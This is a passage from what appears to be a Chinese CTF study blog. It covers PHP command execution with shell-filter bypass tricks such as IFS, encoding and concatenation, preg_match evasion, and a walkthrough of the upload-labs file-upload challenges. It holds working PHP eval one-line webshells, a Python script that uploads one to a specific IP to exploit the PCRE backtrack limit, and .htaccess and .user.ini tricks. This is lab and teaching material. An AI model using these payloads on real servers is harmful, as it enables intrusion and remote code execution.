class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>    <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;ipconfig&quot;</span>;  <br>    <span class="hljs-variable">$array</span> =   <span class="hljs-keyword">array</span>(  <br>     <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>),   <span class="hljs-comment">//标准输入  </span><br>     <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),   <span class="hljs-comment">//标准输出内容  </span><br>     <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)    <span class="hljs-comment">//标准输出错误  </span><br>     );  <br><br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$test</span>,<span class="hljs-variable">$array</span>,<span class="hljs-variable">$pipes</span>);   <span class="hljs-comment">//打开一个进程通道  </span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">stream_get_contents</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);    <span class="hljs-comment">//为什么是$pipes[1]，因为1是输出内容  </span><br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$fp</span>);  <br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="96-96-运算符"><a href="#96-96-运算符" class="headerlink" title="&#96;&#96; 运算符"></a>&#96;&#96; 运算符</h4><p>与shell_exec功能相同，执行shell命令并返回输出的字符串。</p><h4 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h4><p>用于打开缓冲区，开始输出缓冲, 这时PHP停止输出, 在这以后的输出都被转到一个内部的缓冲里。</p><h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&lt;  <span class="hljs-literal">--</span>  如<span class="hljs-built_in">cat</span>&lt;flag.php<br>&lt;&gt;      <span class="hljs-literal">--</span>   如<span class="hljs-built_in">cat</span>&lt;&gt;flag.php<br>%<span class="hljs-number">09</span>  <span class="hljs-literal">--</span>  需要php环境，如<span class="hljs-built_in">cat</span>%<span class="hljs-number">09</span>flag.php<br><span class="hljs-variable">$</span>&#123;IFS&#125;<span class="hljs-variable">$</span>  <br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>  <span class="hljs-literal">--</span>  后面加个<span class="hljs-variable">$</span>与&#123;&#125;类似，起截断作用，<span class="hljs-variable">$9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，如<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS2</span><span class="hljs-variable">$9flag</span>.php<br></code></pre></td></tr></table></figure><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>比如：过滤了cat或者flag</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">变量拼接<br>zxcv0221<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/</span>桌面<span class="hljs-variable">$ </span>a=c;b=at;c=fl;d=ag;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span> <span class="hljs-variable">$c</span><span class="hljs-variable">$d</span><br>you are good!<br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">单引号，双引号绕过<br>zxcv0221<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/</span>桌面<span class="hljs-variable">$ </span>ca<span class="hljs-string">&#x27;&#x27;</span>t flag<br>you are good!<br>zxcv0221<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/</span>桌面<span class="hljs-variable">$ </span>cat<span class="hljs-string">&quot;&quot;</span> flag<br>you are good!<br></code></pre></td></tr></table></figure><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs wren">编码绕过<br>$(<span class="hljs-variable">printf</span> <span class="hljs-string">&quot;\154\163&quot;</span>) <span class="hljs-operator">==</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">ls</span><br>$(<span class="hljs-variable">printf</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span>\x2f<span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>&quot;</span>) <span class="hljs-operator">==</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">cat</span> /<span class="hljs-title function_">flag</span><br>&#123;<span class="hljs-variable">printf</span>,<span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span>\x2f<span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>&quot;</span>&#125;<span class="hljs-operator">|</span>\$<span class="hljs-number">0</span> <span class="hljs-operator">==</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">cat</span> /<span class="hljs-variable">flag</span><br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">栗子：<br>zxcv0221<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/</span>桌面<span class="hljs-variable">$ </span><span class="hljs-variable">$(</span>printf <span class="hljs-string">&quot;\154\163&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="读文件绕过-当cat被过滤"><a href="#读文件绕过-当cat被过滤" class="headerlink" title="读文件绕过(当cat被过滤)"></a>读文件绕过(当cat被过滤)</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">(1)more:一页一页的显示档案内容</span><br><span class="hljs-section">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="hljs-section">(3)head:查看头几行</span><br><span class="hljs-section">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="hljs-section">(5)tail:查看尾几行</span><br>(6)nl：显示的时候，顺便输出行号<br><span class="hljs-section">(7)od:以二进制的方式读取档案内容</span><br><span class="hljs-section">(8)vi:一种编辑器，这个也可以查看</span><br><span class="hljs-section">(9)vim:一种编辑器，这个也可以查看</span><br><span class="hljs-section">(10)sort:可以查看</span><br><span class="hljs-section">(11)uniq:可以查看</span><br>(12)file -f:报错出具体内容<br></code></pre></td></tr></table></figure><h3 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">zxcv0221<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/</span>桌面<span class="hljs-variable">$ </span>c\at fl\ag<br>you are good!<br></code></pre></td></tr></table></figure><h3 id="1、-2等和"><a href="#1、-2等和" class="headerlink" title="$1、$2等和$@"></a>$1、$2等和$@</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">zxcv0221<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/</span>桌面<span class="hljs-variable">$ </span>c<span class="hljs-variable">$1at</span> fl<span class="hljs-variable">$@</span>ag<br>you are good!<br></code></pre></td></tr></table></figure><h3 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">命令`和<span class="hljs-variable">$(</span>命令)都是执行命令的方式<br><br>栗子：<br><br>zxcv0221<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/</span>桌面<span class="hljs-variable">$ </span>echo <span class="hljs-string">&quot;m0re`cat flag`&quot;</span><br>m0reyou are good!<br>zxcv0221<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/</span>桌面<span class="hljs-variable">$ </span>echo <span class="hljs-string">&quot;m0re $(cat flag)&quot;</span><br>m0re you are good!<br>zxcv0221<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/</span>桌面<span class="hljs-variable">$ </span>echo <span class="hljs-string">&quot;m0re $(pwd)&quot;</span><br>m0re /home/zxcv0221/桌面<br></code></pre></td></tr></table></figure><h3 id="管道符绕过"><a href="#管道符绕过" class="headerlink" title="管道符绕过"></a>管道符绕过</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|（就是按位或），直接执行|后面的语句</span><br><br><span class="hljs-string">||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><br><span class="hljs-meta">&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><br><span class="hljs-meta">&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br><br>; 前后都执行，无论前面真假，同<span class="hljs-meta">&amp;（linux也有）</span><br><br>%<span class="hljs-number">0</span>a 换行符，多行区分代码块<br><br>%<span class="hljs-number">0</span>b 同%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p>常见url编码</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs erlang">&#x27; ——&gt;     <span class="hljs-comment">%27</span><br>空格 ——&gt;  <span class="hljs-comment">%20</span><br>#符号 ——&gt;  <span class="hljs-comment">%23</span><br>\ ——&gt;      <span class="hljs-comment">%5C</span><br></code></pre></td></tr></table></figure><h3 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h3><p>$a&#x3D;l<br>$b&#x3D;s<br>$a$b  &#x2F;&#x2F;执行ls</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">使用base64编码进行绕过<br><br>zxcv0221<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/</span>桌面<span class="hljs-variable">$ </span>`echo <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d`<br>you are good!<br></code></pre></td></tr></table></figure><h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">双写关键字绕过<br><br><span class="hljs-keyword">cat</span> \flag\<br><span class="hljs-keyword">cat</span> <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-keyword">cat</span> fla[<span class="hljs-built_in">get</span>]<br></code></pre></td></tr></table></figure><h3 id="IP中的点绕过"><a href="#IP中的点绕过" class="headerlink" title="IP中的点绕过"></a>IP中的点绕过</h3><p>将IP地址转化为数字地址或域名、</p><h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">echo</span> “hello world” &gt;<span class="hljs-built_in">flag</span>.txt    <span class="hljs-comment">//通过&gt;将命令结果存入文件中</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello hacker&quot;</span> &gt;&gt; <span class="hljs-built_in">flag</span>.txt   <span class="hljs-comment">//&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</span><br></code></pre></td></tr></table></figure><h3 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h3><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">换行执行命令<br><br>zxcv0221@kali:~/桌面$ ca\<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">t\</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">fl\</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">ag</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">you are good!</span><br></code></pre></td></tr></table></figure><h2 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h2><h3 id="preg-match绕过"><a href="#preg-match绕过" class="headerlink" title="preg_match绕过"></a>preg_match绕过</h3><h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><h4 id="1、数组绕过"><a href="#1、数组绕过" class="headerlink" title="1、数组绕过"></a>1、数组绕过</h4><p>preg_match只能处理字符串，当传入的subject是数组时会返回false</p><h4 id="2、PCRE回溯次数限制"><a href="#2、PCRE回溯次数限制" class="headerlink" title="2、PCRE回溯次数限制"></a>2、PCRE回溯次数限制</h4><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(<span class="hljs-string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure><p><code>pcre.backtrack_limit</code>给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false</p><h4 id="3、换行符"><a href="#3、换行符" class="headerlink" title="3、换行符"></a>3、换行符</h4><p><code>.</code>不会匹配换行符，如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^.*(flag).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需要</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-variable">$json</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;<span class="hljs-subst">\n</span>flag&quot;</span><br></code></pre></td></tr></table></figure><p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需要传入</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?a=flag%0a<br></code></pre></td></tr></table></figure><h5 id="文件包含读取"><a href="#文件包含读取" class="headerlink" title="文件包含读取"></a>文件包含读取</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><h5 id="高亮显示"><a href="#高亮显示" class="headerlink" title="高亮显示"></a>高亮显示</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">show_resource</span><span class="hljs-params">(<span class="hljs-string">&quot;flag.php&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">highlight_file</span><span class="hljs-params">(<span class="hljs-string">&quot;flag.php&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><h5 id="通过复制、重命名读取php文件内容"><a href="#通过复制、重命名读取php文件内容" class="headerlink" title="通过复制、重命名读取php文件内容"></a>通过复制、重命名读取php文件内容</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">copy</span><span class="hljs-params">(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">rename</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><h5 id="使用fopen函数读取文件"><a href="#使用fopen函数读取文件" class="headerlink" title="使用fopen函数读取文件"></a>使用fopen函数读取文件</h5><p><a href="https://blog.csdn.net/z457181562/article/details/82427813">https://blog.csdn.net/z457181562/article/details/82427813</a></p><p><a href="https://blog.csdn.net/shinebxy/article/details/86073872?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-6.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-6.control">https://blog.csdn.net/shinebxy/article/details/86073872?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-6.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-6.control</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs</title>
    <link href="/2023/04/19/%E5%88%B7%E9%A2%98/upload-labs/"/>
    <url>/2023/04/19/%E5%88%B7%E9%A2%98/upload-labs/</url>
    
    <content type="html"><![CDATA[<h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><h3 id="Pass-01（前端验证）"><a href="#Pass-01（前端验证）" class="headerlink" title="Pass-01（前端验证）"></a>Pass-01（前端验证）</h3><p>第一关通过前端js进行验证，不允许上传.php类型文件<br>（1）可以将php文件修改为后缀为.jpg后缀文件，在通过burp抓包进行修改<br>（2）通过修改前端代码添加.php文件进行上传</p><h3 id="Pass-02（MIME验证）"><a href="#Pass-02（MIME验证）" class="headerlink" title="Pass-02（MIME验证）"></a>Pass-02（MIME验证）</h3><p>第二关通过服务端对数据包的MIME进行检查<br>通过burp修改Content-Type类型</p><h3 id="Pass-03（黑名单验证，特殊后缀）"><a href="#Pass-03（黑名单验证，特殊后缀）" class="headerlink" title="Pass-03（黑名单验证，特殊后缀）"></a>Pass-03（黑名单验证，特殊后缀）</h3><p>第三关禁止上传.asp|.aspx|.php|.jsp后缀文件，可以尝试上传后缀php3,php5的文件进行上传</p><h3 id="Pass-04（黑名单验证，-htaccess）"><a href="#Pass-04（黑名单验证，-htaccess）" class="headerlink" title="Pass-04（黑名单验证，.htaccess）"></a>Pass-04（黑名单验证，.htaccess）</h3><p>第四关禁止常见的后缀文件但没禁止.htaccess<br>可以尝试使用.htaccess重写文件解析绕过</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;FilesMatch <span class="hljs-string">&quot;4.jpg&quot;</span><br>SetHandler <span class="hljs-built_in">application</span>/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>在上传一个4.jpg文件上传成功后.jpg文件就会以,php文件运行<br>测试成功</p><h3 id="Pass-05（黑名单验证，-user-ini-）"><a href="#Pass-05（黑名单验证，-user-ini-）" class="headerlink" title="Pass-05（黑名单验证，.user.ini.）"></a>Pass-05（黑名单验证，.user.ini.）</h3><p>源码里把所有可以解析的后缀名都给写死了，包括大小写，转换，空格，还有点号，正常的php类文件上传不了了，并且拒绝上传 .htaccess 文件<br>反复观察发现没有被限制的后缀名有 .php7 以及 .ini<br>php.ini 是 php的配置文件，.user.ini 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。</p><p>但是想要引发 .user.ini 解析漏洞需要三个前提条件</p><p>1服务器脚本语言为PHP  </p><p>2服务器使用CGI／FastCGI模式  </p><p>3上传目录下要有可执行的php文件</p><p>创建一个.user.ini文件并把它上传<br><code>auto_prepend_file=GIF89a.jpg</code><br>.user.ini文件里的意思是：所有的php文件都自动包含GIF89a.jpg文件。.user.ini相当于一个用户自定义的php.ini<br>接着上传GIF89a.jpg文件，文件内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;shell&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后在复制图像地址后，用蚁剑访问将文件名改为readme.php</p><hr><p>也可用 php. . 点空格点 绕过上传</p><h3 id="Pass-06（黑名单验证，大小写绕过）"><a href="#Pass-06（黑名单验证，大小写绕过）" class="headerlink" title="Pass-06（黑名单验证，大小写绕过）"></a>Pass-06（黑名单验证，大小写绕过）</h3><p>这一关同样是后端黑名单，同时过滤掉.htaccess和.ini。但是没有使用strtolower()函数，可以使用大小写绕过黑名单<br>把.php 格式改为 .Php 上传上去之后，就会自动解析为.php<br>然后直接上传，蚁剑连接</p><h3 id="Pass-07（黑名单验证，空格绕过）"><a href="#Pass-07（黑名单验证，空格绕过）" class="headerlink" title="Pass-07（黑名单验证，空格绕过）"></a>Pass-07（黑名单验证，空格绕过）</h3><p>这一关黑名单，没有使用trim()去除空格，可以使用空格绕过黑名单<br>抓包，修改上传一句话木马文件名zoe.php（注意这里有个空格）<br>放包之后用蚁剑连接</p><h3 id="Pass-08（黑名单验证，点号绕过）"><a href="#Pass-08（黑名单验证，点号绕过）" class="headerlink" title="Pass-08（黑名单验证，点号绕过）"></a>Pass-08（黑名单验证，点号绕过）</h3><p>这一关黑名单，没有使用deldot()过滤文件名末尾的点，可以使用文件名后加.进行绕过<br>抓包，修改上传一句话木马文件名zoe.php.（注意这里有个点）</p><h3 id="Pass-09（黑名单验证，特殊字符-DATA绕过）"><a href="#Pass-09（黑名单验证，特殊字符-DATA绕过）" class="headerlink" title="Pass-09（黑名单验证，特殊字符::$DATA绕过）"></a>Pass-09（黑名单验证，特殊字符::$DATA绕过）</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">这一关黑名单，没有对::<span class="hljs-variable">$D</span> A T A 进 行 处 理 ， 可 以 使 用::<span class="hljs-variable">$DATA</span>进行处理，<br><br>补充知识：php在window的时候如果文件名+<span class="hljs-string">&quot;::$DATA&quot;</span>会把::<span class="hljs-variable">$DATA</span>之后的数据当成文件流处理,不会检测后缀名，且保持<span class="hljs-string">&quot;::$DATA&quot;</span>之前的文件名 他的目的就是不检查后缀名。<br><br>上传<span class="hljs-title class_">PHP</span>一句话文件，抓包改后缀zoe.php::<span class="hljs-variable">$DATA</span><br>然后使用蚁剑连接zoe.php （注意蚁剑连接路径不要加上::<span class="hljs-variable">$DATA</span>）<br></code></pre></td></tr></table></figure><h3 id="Pass-10（黑名单，点空格点绕过）"><a href="#Pass-10（黑名单，点空格点绕过）" class="headerlink" title="Pass-10（黑名单，点空格点绕过）"></a>Pass-10（黑名单，点空格点绕过）</h3><p>这一关黑名单，最后上传路径直接使用文件名进行拼接，而且只对文件名进行file name&#x3D;deldot(file_name)操作去除文件名末尾的点，构造后缀绕过黑名单</p><p>补充知识：deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来</p><p>上传zoe.php 然后用bp改后缀加点空格点（即文件名为zoe.php. .）<br>使用蚁剑连接zoe.php.</p><h3 id="Pass-11（黑名单验证，双写绕过）"><a href="#Pass-11（黑名单验证，双写绕过）" class="headerlink" title="Pass-11（黑名单验证，双写绕过）"></a>Pass-11（黑名单验证，双写绕过）</h3><p>这一关黑名单，使用str_ireplace()函数寻找文件名中存在的黑名单字符串，将它替换成空（即将它删掉），可以使用双写绕过黑名单</p><p>补充知识：str_ireplace(find,replace,string,count) 函数替换字符串中的一些字符（不区分大小写）</p><p>上传zoe.php 然后用bp改后缀为.pphphp使用蚁剑连接zoe.php</p><h3 id="Pass-12（get00截断）"><a href="#Pass-12（get00截断）" class="headerlink" title="Pass-12（get00截断）"></a>Pass-12（get00截断）</h3><p><em>这一关白名单，最终文件的存放位置是以拼接的方式，可以使用%00截断，但需要php版本&lt;5.3.4，并且magic_quotes_gpc关闭。</em></p><p>原理：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery">知识补充：<br>strrpos<span class="hljs-built_in">(string</span>,find[,<span class="hljs-keyword">start</span>]) 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。<br>substr<span class="hljs-built_in">(string</span>,<span class="hljs-keyword">start</span>[,length])函数返回字符串的一部分(从<span class="hljs-keyword">start</span>开始 [，长度为length])<br>magic_quotes_gpc 着重偏向数据库方面，是为了防止sql注入，但magic_quotes_gpc开启还会对<span class="hljs-variable">$_REQUEST</span>, <span class="hljs-variable">$_GET</span>,<span class="hljs-variable">$_POST</span>,<span class="hljs-variable">$_COOKIE</span> 输入的内容进行过滤<br></code></pre></td></tr></table></figure><p>上传zoe.php用BP抓包修改参数，把upload&#x2F;后面加上zoe.php%00，下面的filename&#x3D;”zoe.php”改为zoe.png</p><h3 id="Pass-14（图片马unpack）"><a href="#Pass-14（图片马unpack）" class="headerlink" title="Pass-14（图片马unpack）"></a>Pass-14（图片马unpack）</h3><p>这一关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件<br>使用 <code>图片马 + 文件包含</code> 绕过</p><p><code>cmd</code>使用 <code>copy 777.png/b + zoe.php pass14.png</code> 制作<code>图片马</code>，上传图片马</p><h3 id="Pass-15（getimagesize图片马）"><a href="#Pass-15（getimagesize图片马）" class="headerlink" 